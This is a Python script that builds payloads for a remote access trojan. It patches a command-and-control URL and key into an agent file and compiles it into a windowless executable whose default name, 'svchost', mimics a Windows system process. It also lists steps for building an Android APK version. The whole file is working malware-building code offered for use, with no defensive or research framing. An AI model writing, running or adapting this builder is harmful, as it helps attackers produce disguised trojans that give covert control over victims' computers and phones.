#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAT Builder :: inject C2 URL + key into agent, produce standalone payload.
"""

import os, sys, re, argparse, subprocess, base64, hashlib, shutil, tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
AGENT = os.path.join(ROOT, "agent", "agent.py")
OUT   = os.path.join(ROOT, "payloads")
os.makedirs(OUT, exist_ok=True)

def patch(src, c2_url, master_key):
    key_hash = hashlib.sha256(master_key.encode()).digest()
    key_b64 = base64.b64encode(key_hash).decode()
    src = re.sub(r'^C2_URL\s*=.*$', f'C2_URL = "{c2_url}"', src, flags=re.M)
    src = re.sub(r'^KEY\s*=.*$',
                 f'KEY = __import__("base64").b64decode("{key_b64}")',
                 src, flags=re.M)
    return src

def build(target, c2_url, master_key, out_name, icon=None, onefile=True):
    with open(AGENT, "r", encoding="utf-8") as f:
        src = f.read()
    patched = patch(src, c2_url, master_key)
    tmp = os.path.join(tempfile.mkdtemp(), "agent_patched.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(patched)

    if target == "py":
        dest = os.path.join(OUT, out_name + ".py")
        shutil.copy(tmp, dest)
        print(f"[+] py payload -> {dest}")
        return dest

    cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm", "--clean"]
    if onefile: cmd.append("--onefile")
    if target == "exe": cmd += ["--noconsole"]
    if icon and os.path.isfile(icon):
        cmd += ["--icon", icon]
    cmd += ["--name", out_name, tmp]
    print("[*] " + " ".join(cmd))
    subprocess.run(cmd, check=True)
    dist = os.path.join(os.getcwd(), "dist")
    ext = ".exe" if target == "exe" and os.name == "nt" else ""
    produced = os.path.join(dist, out_name + ext)
    if os.path.isfile(produced):
        dest = os.path.join(OUT, os.path.basename(produced))
        shutil.move(produced, dest)
        print(f"[+] {target} payload -> {dest}")
        return dest
    print("[!] build finished, check ./dist")
    return produced

def main():
    ap = argparse.ArgumentParser(prog="rat-build")
    ap.add_argument("-t", "--target", required=True, choices=["py","exe","elf","apk"])
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-k", "--key", required=True)
    ap.add_argument("-n", "--name", default="svchost")
    ap.add_argument("--icon", default=None)
    ap.add_argument("--no-onefile", action="store_true")
    args = ap.parse_args()

    if args.target == "apk":
        print("""
[!] APK build requires buildozer + Android SDK/NDK.
    Steps (on Linux/Kali):
      1) pip install buildozer cython
      2) create buildozer.spec with your agent as main.py
      3) buildozer -v android debug
""")
        return

    build(args.target, args.url, args.key, args.name,
          args.icon, onefile=not args.no_onefile)

if __name__ == "__main__":
    main()